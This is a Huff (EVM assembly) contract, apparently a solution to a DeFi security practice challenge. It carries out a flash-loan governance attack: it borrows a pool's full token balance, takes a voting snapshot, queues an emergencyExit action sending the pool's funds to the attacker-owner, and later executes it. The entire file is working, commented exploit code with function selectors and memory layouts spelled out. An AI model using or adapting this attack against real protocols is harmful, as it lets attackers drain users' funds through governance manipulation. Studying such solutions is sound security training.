// Storage 
#define constant OWNER_SLOT = FREE_STORAGE_POINTER()
#define constant GOVERNANCE_SLOT = FREE_STORAGE_POINTER()
#define constant ID_SLOT = FREE_STORAGE_POINTER()
#define constant CALLBACK_SIG = 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9

// Constructor
#define macro CONSTRUCTOR() = takes (0) returns (0) {
    // Copy caller into OWNER_SLOT in storage
    caller          // [msg.sender] - msg.sender
    [OWNER_SLOT]    // [0x00, msg.sender] - storage slot where to store msg.sender
    sstore          // [] - copied msg.sender to storage slot 0x00

    // STORAGE:
    // [SLOT 0x00] 000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address
}

// Modifier
#define macro ONLY_OWNER() = takes (0) returns (0) {
    caller          // [caller]
    [OWNER_SLOT]    // [0x00, caller] - storage slot where owner is stored
    sload           // [owner, caller] - loaded owner address onto stack from storage slot 0x00
    eq              // [0/1] - consumes top two items and returns 1 if equal, 0 otherwise
    is_owner        // [is_owner_label, 0/1] - byte offset in code for execution path
    jumpi           // [] - consumes top two items and execution path jumps to is_owner_label if 2nd item is not 0

    0x00            // [0x00] - size
    0x00            // [0x00, 0x00] - byte offset
    revert          // [] - reverts with data of size 0x00, starting from byte offset 0x00 in memory (reverts with no data)

    is_owner:       // is_owner label. execution continues here if the caller is the owner
}

// Start Attack function
#define macro START_ATTACK() = takes(3) returns (0) {
    // takes: [governance, token, pool]

    // Copy `flashLoan(address,address,uint256,bytes)` func sig & args into mem for future CALL
    // the last param is of type bytes so we will need to build out the calldata for this dynamic type
    0x5cffe9de      // [0x5cffe9de, governance, token, pool] - func sig
    0x00            // [0x00, 0x5cffe9de, governance, token, pool] - byte offset in mem
    mstore          // [governance, token, pool] - copied func sig into mem at offset 0x00
    address         // [self, governance, token, pool] - self
    0x20            // [0x20, self, governance, token, pool] - byte offset in mem
    mstore          // [governance, token, pool] - copied self into mem at offset 0x20
    dup2            // [token, governance, token, pool] - duplicate token
    0x40            // [0x40, token, governance, token, pool] - byte offset in mem
    mstore          // [governance, token, pool] - copied token into mem at offset 0x40
    0x80            // [0x80, governance, token, pool] - offset for bytes param
    0x80            // [0x80, 0x80, governance, token, pool] - byte offset in mem
    mstore          // [governance, token, pool] - copied offset for bytes param in mem offset 0x80 (initialized offset 0x60 to 0's)
    
    // Copy `balanceOf(address)` and flash pool into mem to use as calldata for STATICCALL 
    // Note that we are building out the calldata for the flashLoan call and the balanceOf call at the same time
    0x70a08231      // [0x70a08231, governance, token, pool] - func sig
    0xa0            // [0xa0, 0x70a08231, governance, token, pool] - byte offset in mem
    mstore          // [governance, token, pool] - copied func sig into mem at offset 0xa0
    dup3            // [pool, governance, token, pool] - duplicate pool
    0xc0            // [0xc0, pool, governance, token, pool] - byte offset in mem
    mstore          // [governance, token, pool] - copied pool into mem at offset 0xc0
    dup2            // [token, governance, token, pool] - duplicate token
    0xe0            // [0xe0, token, governance, token, pool] - byte offset in mem
    mstore          // [governance, token, pool] - copied token into mem at offset 0xe0
    0x100           // [0x100, governance, token, pool] - byte offset in mem
    mstore          // [token, pool] - copied governance into mem at offset 0x100

    // MEMORY:
    // [OFFSET 0x00]   000000000000000000000000000000000000000000000000000000005cffe9de -> `flashLoan(address,address,uint256,bytes)` func sig
    // [OFFSET 0x20]   0000000000000000000000006b63b0441371ddfbd65a65ef27642e7a622f29dd -> self 
    // [OFFSET 0x40]   000000000000000000000000274b028b03a250ca03644e6c578d81f019ee1323 -> token address
    // [OFFSET 0x60]   0000000000000000000000000000000000000000000000000000000000000000 -> amount (uint256)
    // [OFFSET 0x80]   0000000000000000000000000000000000000000000000000000000000000080 -> bytes param offset
    // [OFFSET 0xa0]   0000000000000000000000000000000000000000000000000000000070a08231 -> `balanceOf(address)` func sig
    // [OFFSET 0xc0]   000000000000000000000000f2df0b975c0c9efa2f8ca0491c2d1685104d2488 -> pool address
    // [OFFSET 0xe0]   000000000000000000000000274b028b03a250ca03644e6c578d81f019ee1323 -> token address 
    // [OFFSET 0x100]  000000000000000000000000bcf7fffd8b256ec51a36782a52d0c34f6474d951 -> governance address 

    // STATICCALL into token
    0x20            // [0x20, token, pool] - size of return data (uint256)
    0x60            // [0x60, 0x20, token, pool] - byte offset in mem where return data is copied
    0x24            // [0x24, 0x60, 0x20, token, pool] - size of calldata
    0xbc            // [0xbc, 0x24, 0x60, 0x20, token, pool] - byte offset in mem where calldata starts
    dup5            // [token, 0xbc, 0x24, 0x60, 0x20, token, pool] - calling token
    gas             // [gas, token, 0xbc, 0x24, 0x60, 0x20, token, pool] - gas to send with staticcall (gasleft())
    staticcall      // [success, token, pool]
    iszero          // [0/1, token, pool]
    throw_error     // [throw_error, 0/1, token, pool]
    jumpi           // [token, pool]
    pop             // [pool]

    // MEMORY:
    // [OFFSET 0x00]   000000000000000000000000000000000000000000000000000000005cffe9de -> `flashLoan(address,address,uint256,bytes)` func sig
    // [OFFSET 0x20]   0000000000000000000000006b63b0441371ddfbd65a65ef27642e7a622f29dd -> self 
    // [OFFSET 0x40]   000000000000000000000000274b028b03a250ca03644e6c578d81f019ee1323 -> token address
    // [OFFSET 0x60]   000000000000000000000000000000000000000000013DA329B6336471800000 -> return data (amount = uint256) from balanceOf STATICCALL
    // [OFFSET 0x80]   0000000000000000000000000000000000000000000000000000000000000080 -> bytes param offset
    // [OFFSET 0xa0]   0000000000000000000000000000000000000000000000000000000070a08231 -> `balanceOf(address)` func sig
    // [OFFSET 0xc0]   000000000000000000000000f2df0b975c0c9efa2f8ca0491c2d1685104d2488 -> pool address
    // [OFFSET 0xe0]   000000000000000000000000274b028b03a250ca03644e6c578d81f019ee1323 -> token address 
    // [OFFSET 0x100]  000000000000000000000000bcf7fffd8b256ec51a36782a52d0c34f6474d951 -> governance address

    // Copy length of bytes param data into mem (address,address,address)
    0x60            // [0x60, pool] - length of bytes param data
    0xa0            // [0xa0, 0x60, pool] - byte offset in mem
    mstore          // [pool] - copied 0x60 (96 bytes) into mem at offset 0xa0

    // MEMORY:
    // [OFFSET 0x00]   000000000000000000000000000000000000000000000000000000005cffe9de -> `flashLoan(address,address,uint256,bytes)` func sig
    // [OFFSET 0x20]   0000000000000000000000006b63b0441371ddfbd65a65ef27642e7a622f29dd -> self 
    // [OFFSET 0x40]   000000000000000000000000274b028b03a250ca03644e6c578d81f019ee1323 -> token address
    // [OFFSET 0x60]   000000000000000000000000000000000000000000013DA329B6336471800000 -> return data (amount = uint256) from balanceOf STATICCALL
    // [OFFSET 0x80]   0000000000000000000000000000000000000000000000000000000000000080 -> bytes param offset
    // [OFFSET 0xa0]   0000000000000000000000000000000000000000000000000000000000000060 -> bytes param length
    // [OFFSET 0xc0]   000000000000000000000000f2df0b975c0c9efa2f8ca0491c2d1685104d2488 -> pool address
    // [OFFSET 0xe0]   000000000000000000000000274b028b03a250ca03644e6c578d81f019ee1323 -> token address 
    // [OFFSET 0x100]  000000000000000000000000bcf7fffd8b256ec51a36782a52d0c34f6474d951 -> governance address

    // CALL into pool
    0x00            // [0x00, pool] - size of return data
    dup1            // [0x00, 0x00, pool] - byte offset in mem where return data is copied
    0x104           // [0x104, 0x00, 0x00, pool] - size of calldata
    0x1c            // [0x1c, 0x104, 0x00, 0x00, pool] - byte offset in mem where calldata starts
    dup3            // [0x00, 0x1c, 0x104, 0x00, 0x00, pool] - msg.value to send with call 
    dup6            // [pool, 0x00, 0x1c, 0x104, 0x00, 0x00, pool] - calling pool
    gas             // [gas, pool, 0x00, 0x1c, 0x104, 0x00, 0x00, pool] - gas to send with call (gasleft())
    call            // [success, pool]
    iszero          // [0/1, pool]
    throw_error     // [throw_error, 0/1, pool]
    jumpi           // [pool]
    pop             // []

    stop
}

// FLash loan callback function
#define macro FLASH_CALLBACK() = takes(4) returns (0) {
    // takes: [governance, token, pool, amount, _token, initiator]

    // Check msg.sender, initiator, and token to verify validity of call
    dup3               // [pool, governance, token, pool, amount, _token, initiator]
    caller             // [msg.sender, pool, governance, token, pool, amount, _token, initiator] - compare msg.sender & pool
    eq                 // [0/1, governance, token, pool, amount, _token, initiator]
    iszero             // [0/1, governance, token, pool, amount, _token, initiator]
    throw_error        // [throw_error, 0/1, governance, token, pool, amount, _token, initiator]
    jumpi              // [governance, token, pool, amount, _token, initiator]
    swap5              // [initiator, token, pool, amount, _token, governance] - swap governance & initiator
    address            // [self, initiator, token, pool, amount, _token, governance] - self
    eq                 // [0/1, token, pool, amount, _token, governance] - compare self & initiator
    iszero             // [0/1, token, pool, amount, _token, governance]
    throw_error        // [throw_error, 0/1, token, pool, amount, _token, governance]
    jumpi              // [token, pool, amount, _token, governance]
    dup4               // [_token, token, pool, amount, _token, governance]
    eq                 // [0/1, pool, amount, _token, governance] - compare _token and token
    iszero             // [0/1, pool, amount, _token, governance]
    throw_error        // [throw_error, 0/1, pool, amount, _token, governance]
    jumpi              // [pool, amount, _token, governance]

    // Copy `snapshot()` and `queueAction(address,uint128,bytes)` func sigs into mem to use as calldata for CALLs
    0x9711715a52ecb90a // [0x9711715a52ecb90a, pool, amount, _token, governance] - func sigs
    0x00               // [0x00, 0x9711715a52ecb90a, pool, amount, _token, governance] - byte offset in mem
    mstore             // [pool, amount, _token, governance] - copied func sigs into mem at offset 0x00

    // MEMORY:
    // [OFFSET 0x00]  0000000000000000000000000000000000000000000000009711715a52ecb90a ->`snapshot()` and `queueAction(address,uint128,bytes)` func sigs  

    // CALL into token - snapshot()
    0x00               // [0x00, pool, amount, _token, governance] - size of return data
    dup1               // [0x00, 0x00, pool, amount, _token, governance] - byte offset in mem where return data is copied
    0x04               // [0x04, 0x00, 0x00, pool, amount, _token, governance] - size of calldata
    0x18               // [0x18, 0x04, 0x00, 0x00, pool, amount, _token, governance] - byte offset in mem where calldata starts
    dup3               // [0x00, 0x18, 0x04, 0x00, 0x00, pool, amount, _token, governance] - msg.value to send with call
    dup8               // [_token, 0x00, 0x18, 0x04, 0x00, 0x00, pool, amount, _token, governance] - calling token
    gas                // [gas, _token, 0x00, 0x18, 0x04, 0x00, 0x00, pool, amount, _token, governance] - gas to send with call (gasleft())
    call               // [success, pool, amount, _token, governance] 
    iszero             // [0/1, pool, amount, _token, governance] 
    throw_error        // [throw_error, 0/1, pool, amount, _token, governance]
    jumpi              // [pool, amount, _token, governance]

    // Copy args for `queueAction` into mem
    0x20               // [0x20, pool, amount, _token, governance] - byte offset in mem
    mstore             // [amount, _token, governance] - copied pool into mem at offset 0x20

    // Copy the third param in `queueAction` is of type byte so we need to build the calldata for this dynamic type  
    0x60               // [0x60, amount, _token, governance] - offset for bytes param
    dup1               // [0x60, 0x60, amount, _token, governance] - byte offset in mem
    mstore             // [amount, _token, governance] - copied 0x60 into mem at offset 0x60 (0x40 is initialized to 0s for 2nd param)
    0x24               // [0x24, amount, _token, governance] - length of bytes param
    0x80               // [0x80, 0x24, amount, _token, governance] - byte offset in mem
    mstore             // [amount, _token, governance] - copied 0x24 (36 bytes) into mem at offset 0x80
    0xa441d067         // [0xa441d067, amount, _token, governance] - `emergencyExit(address)` func sig
    0xe0               // [0xe0, 0xa441d067, amount, _token, governance] - # of bits to shift left (224)
    shl                // [0xa441d067_, amount, _token, governance] - shifted func sig 224 bits to the left (made it into type bytes4 for our calldata)
    0xa0               // [0xa0, 0xa441d067_, amount, _token, governance] - byte offset in mem
    mstore             // [amount, _token, governance] - copied func sig into mem at offset 0xa0
    [OWNER_SLOT]       // [0x00, amount, _token, governance] - storage slot where owner address is
    sload              // [owner, amount, _token, governance] - copied owner onto stack from storage slot 0x00
    0xa4               // [0xb0, owner, amount, _token, governance] - byte offset in mem
    mstore             // [amount, _token, governance] - copied owner into mem at offset 0xa4


    // MEMORY:
    // [OFFSET 0x00]  0000000000000000000000000000000000000000000000009711715a52ecb90a ->`snapshot()` and `queueAction(address,uint128,bytes)` func sigs  
    // [OFFSET 0x20]  000000000000000000000000f2df0b975c0c9efa2f8ca0491c2d1685104d2488 -> pool address
    // [OFFSET 0x40]  0000000000000000000000000000000000000000000000000000000000000000 -> value (uint256)
    // [OFFSET 0x60]  0000000000000000000000000000000000000000000000000000000000000060 -> bytes param offset
    // [OFFSET 0x80]  0000000000000000000000000000000000000000000000000000000000000024 -> bytes param length
    // [OFFSET 0xa0]  a441d067000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d62 -> `emergencyExit(address)` func sig + owner address
    // [OFFSET 0xc0]  8176a1e700000000000000000000000000000000000000000000000000000000 -> rest of owner address +  28 bytes padding

    // CALL into governance
    0x20               // [0x20, amount, _token, governance] - size of return data
    0x60               // [0x60, 0x20, amount, _token, governance] - byte offset in mem where return data will be copied
    0xc4               // [0xc4, 0x60, 0x20, amount, _token, governance] - size of calldata (196 bytes)
    0x1c               // [0x1c, 0xc4, 0x60, 0x20, amount, _token, governance] - byte offset in mem where calldata starts
    0x00               // [0x00, 0x1c, 0xc4, 0x60, 0x20, amount, _token, governance] - msg.value to send with call
    dup8               // [governance, 0x00, 0x1c, 0xc4, 0x60, 0x20, amount, _token, governance] - calling governance
    gas                // [gas, governance, 0x00, 0x1c, 0xc4, 0x60, 0x20, amount, _token, governance] - gas to send with call (gasleft())
    call               // [success, amount, _token, governance]
    iszero             // [0/1, amount, _token, governance] 
    throw_error        // [throw_error, 0/1, amount, _token, governance]
    jumpi              // [amount, _token, governance]

    // MEMORY:
    // [OFFSET 0x00]  0000000000000000000000000000000000000000000000009711715a52ecb90a ->`snapshot()` and `queueAction(address,uint128,bytes)` func sigs  
    // [OFFSET 0x20]  000000000000000000000000f2df0b975c0c9efa2f8ca0491c2d1685104d2488 -> pool address
    // [OFFSET 0x40]  0000000000000000000000000000000000000000000000000000000000000000 -> value (uint256)
    // [OFFSET 0x60]  0000000000000000000000000000000000000000000000000000000000000001 -> return data (uint256) - action id
    // [OFFSET 0x80]  0000000000000000000000000000000000000000000000000000000000000024 -> bytes param length
    // [OFFSET 0xa0]  a441d067000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d62 -> `emergencyExit(address)` func sig + owner address
    // [OFFSET 0xc0]  8176a1e700000000000000000000000000000000000000000000000000000000 -> rest of owner address +  28 bytes padding

    // Copy `approve(address,amount)` and amount into mem to use as calldata for CALL
    0x095ea7b3         // [0x095ea7b3, amount, _token, governance] - func sig
    0x00               // [0x00, 0x095ea7b3, amount, _token, governance] - byte offset in mem
    mstore             // [amount, _token, governance] - copied func sig into mem at offset 0x00
    0x40               // [0x40, amount, _token, governance] - byte offset in mem
    mstore             // [_token, governance] - copied amount into mem at offset 0x40

    // MEMORY:
    // [OFFSET 0x00]  00000000000000000000000000000000000000000000000000000000095ea7b3 ->`approve(address,amount)` func sig
    // [OFFSET 0x20]  000000000000000000000000f2df0b975c0c9efa2f8ca0491c2d1685104d2488 -> pool address
    // [OFFSET 0x40]  000000000000000000000000000000000000000000013DA329B6336471800000 -> amount (uint256)
    // [OFFSET 0x60]  0000000000000000000000000000000000000000000000000000000000000001 -> return data (uint256) - action id
    // [OFFSET 0x80]  0000000000000000000000000000000000000000000000000000000000000024 -> bytes param length
    // [OFFSET 0xa0]  a441d067000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d62 -> `emergencyExit(address)` func sig + owner address
    // [OFFSET 0xc0]  8176a1e700000000000000000000000000000000000000000000000000000000 -> rest of owner address +  28 bytes padding

    // CALL into token
    0x00              // [0x00, _token, governance] - size of return data
    dup1              // [0x00, 0x00 _token, governance] - byte offset in mem where return data is copied
    0x44              // [0x44, 0x00, 0x00, _token, governance] - size of calldata
    0x1c              // [0x1c, 0x44, 0x00, 0x00, _token, governance] - byte offset in mem where calldata starts
    dup3              // [0x00, 0x1c, 0x44, 0x00, 0x00, _token, governance] - msg.value to send with call
    dup6              // [_token 0x00, 0x1c, 0x44, 0x00, 0x00, _token, governance] - calling _token
    gas               // [gas, _token, 0x00, 0x1c, 0x44, 0x00, 0x00, _token, governance] - gas to send with call (gaslef())
    call              // [success, _token, governance]
    iszero            // [0/1, _token, governance]
    throw_error       // [throw_error, 0/1, _token, governance]
    jumpi             // [_token, governance]
    pop               // [governance]

    // Copy governance and action id into storage
    [GOVERNANCE_SLOT] // [0x01, governance] - storage slot where to store governance
    sstore            // [] - copied governance into storage slot 0x01
    0x60              // [0x60] - byte offset in mem
    mload             // [id] - copied action id onto stack from mem
    [ID_SLOT]         // [0x02, id] - storage slot where action id will be stored
    sstore            // [] - copied action id into storage slot 0x02

    // STORAGE:
    // [SLOT 0x00] 000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address
    // [SLOT 0x01] 000000000000000000000000bcf7fffd8b256ec51a36782a52d0c34f6474d951 -> governance address
    // [SLOT 0x02] 0000000000000000000000000000000000000000000000000000000000000001 -> action id


    // Return callback signature for successful callback
    [CALLBACK_SIG]    // [callback_sig]
    0x00              // [0x00, callback_sig] - byte offset in mem
    mstore            // [] - copied callback_sig into mem at offset 0x00
    
    // MEMORY:
    // [OFFSET 0x00]  439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9 -> callback signature (bytes32)
    // [OFFSET 0x20]  000000000000000000000000f2df0b975c0c9efa2f8ca0491c2d1685104d2488 -> pool address
    // [OFFSET 0x40]  000000000000000000000000000000000000000000013DA329B6336471800000 -> amount (uint256)
    // [OFFSET 0x60]  0000000000000000000000000000000000000000000000000000000000000001 -> return data (uint256) - action id
    // [OFFSET 0x80]  0000000000000000000000000000000000000000000000000000000000000024 -> bytes param length
    // [OFFSET 0xa0]  a441d067000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d62 -> `emergencyExit(address)` func sig + owner address
    // [OFFSET 0xc0]  8176a1e700000000000000000000000000000000000000000000000000000000 -> rest of owner address +  28 bytes padding

    0x20              // [0x20] - size of data to return 
    0x00              // [0x00, 0x20] - byte offset in mem where return data starts
    return            // [] - returns callback_sig
}

// Finish Attack function
#define macro FINISH_ATTACK() = takes(0) returns (0) {
    // Copy `executeAction(uint256)` func sig and action id into mem to use as calldata for CALL
    0xc0c1cf55         // [0xc0c1cf55] - func sig
    0x00               // [0x00, 0xc0c1cf55] - byte offset in mem
    mstore             // [] - copied func sig into mem at offset 0x00
    [ID_SLOT]          // [0x02] - storage slot where action id is
    sload              // [id] - copied action id onto stack from storage slot 0x02
    0x20               // [0x20, id] - byte offset in mem
    mstore             // [] - copied action id into mem at offset 0x20

    // MEMORY:
    // [OFFSET 0x00]  00000000000000000000000000000000000000000000000000000000c0c1cf55 -> `executeAction(uint256)` func sig
    // [OFFSET 0x20]  0000000000000000000000000000000000000000000000000000000000000001 -> action id (uint256)

    // CALL into governance
    0x00               // [0x00] - size of return data
    0x00               // [0x00, 0x00] - byte offset in mem where return data is copied
    0x24               // [0x24, 0x00, 0x00] - size of calldata
    0x1c               // [0x1c, 0x24, 0x00, 0x00] - byte offset in mem where calldata starts
    dup3               // [0x00, 0x1c, 0x24, 0x00, 0x00] - msg.value to send with call
    [GOVERNANCE_SLOT]  // [0x01, 0x00, 0x1c, 0x24, 0x00, 0x00] - storage slot where governance is
    sload              // [governance, 0x00, 0x1c, 0x24, 0x00, 0x00] - copied governance onto stack from storage slot 0x01
    gas                // [gas, governance, 0x00, 0x1c, 0x24, 0x00, 0x00] - gas to send with call (gasleft())
    call               // [success] - consumes top 7 items and pushes 1 if call did not revert, 0 otherwise
    iszero             // [0/1]
    throw_error        // [throw_error, 0/1]
    jumpi              // []
}

// Function Dispatching
#define macro MAIN() = takes (0) returns (0) {
    // Identify which function is being called
    0x00          // [0x00] - the byte offset in calldata that we will read 32 bytes from
    calldataload  // [calldata] - calldataload consumes top item from stack and pushes 32 bytes of calldata, from byte offset, onto stack
    0xe0          // [0xe0, calldata] - 0xe0 is 224 bits
    shr           // [func_sig] - shr consumes top two items off the stack, performs a logical right shift and pushes resulting value of stack
                  // Here we are shifting the calldata 224 bits to the right (256 - 224 = 32 bits = 4 bytes) and isolating the first 4 bytes (function sig)

    dup1          // [func_sig, func_sig]
    0x13671c6a    // [0x13671c6a, func_sig, func_sig] - pushing func sig of `start_attack(address,address,address)` onto the stack
    eq            // [0/1, func_sig] - eq consumes top two items from stack and pushes 1 onto stack if they are equal, otherwise 0
    start_attack  // [start_attack, 0/1, func_sig] - start_attack is a label (byte offset) for the start_attack instructions in the code
    jumpi         // [func_sig] = jumpi consumes top two items from stack and jumps to new execution path if second item is not 0, otherwise executions continues on current path

    dup1          // [func_sig, func_sig]
    0x23e30c8b    // [0x23e30c8b, func_sig, func_sig] - pushing func sig of 'onFlashLoan(address,address,uint256,uint256,bytes)' onto the stack
    eq            // [0/1, func_sig] - eq consumes top two items from stack and pushes 1 onto stack if they are equal, otherwise 0
    callback      // [callback, 0/1, func_sig] - callback is a label (byte offset) for the onFlashLoan callback instructions in the code
    jumpi         // [func_sig] = jumpi consumes top two items from stack and jumps to new execution path if second item is not 0, otherwise executions continues on current path

    dup1          // [func_sig, func_sig]
    0x87d6c8b4    // [0x87d6c8b4, func_sig, func_sig] - pushing func sig of `finish_attack()` onto the stack
    eq            // [0/1, func_sig] - eq consumes top two items from stack and pushes 1 onto stack if they are equal, otherwise 0
    finish_attack // [finish_attack, 0/1, func_sig] - finish_attack is a label (byte offset) for the finish_attack instructions in the code
    jumpi         // [func_sig] = jumpi consumes top two items from stack and jumps to new execution path if second item is not 0, otherwise executions continues on current path
    
    throw_error:  // label for revert path
        0x00 0x00 revert

    start_attack: // label for attack instructions
        ONLY_OWNER()
        0x04
        calldataload     // [pool]
        0x24
        calldataload     // [token, pool]
        0x44
        calldataload     // [governance, token, pool]
        START_ATTACK()

    callback:     // label for flash loan callback instructions
        0x04
        calldataload     // [initiator]
        0x24 
        calldataload     // [_token, initiator]
        0x44 
        calldataload     // [amount, _token, initiator] 
        // 0x64 is offset for fee
        // 0x84 is offset for bytes offset
        // 0xa4 is offset for bytes length
        0xc4 
        calldataload     // [pool, amount, _token, self]
        0xe4  
        calldataload     // [token, pool, amount, _token, initiator]
        0x104  
        calldataload     // [governance, token, pool, amount, _token, initiator]
        FLASH_CALLBACK()

    finish_attack:
        ONLY_OWNER()
        FINISH_ATTACK()
}
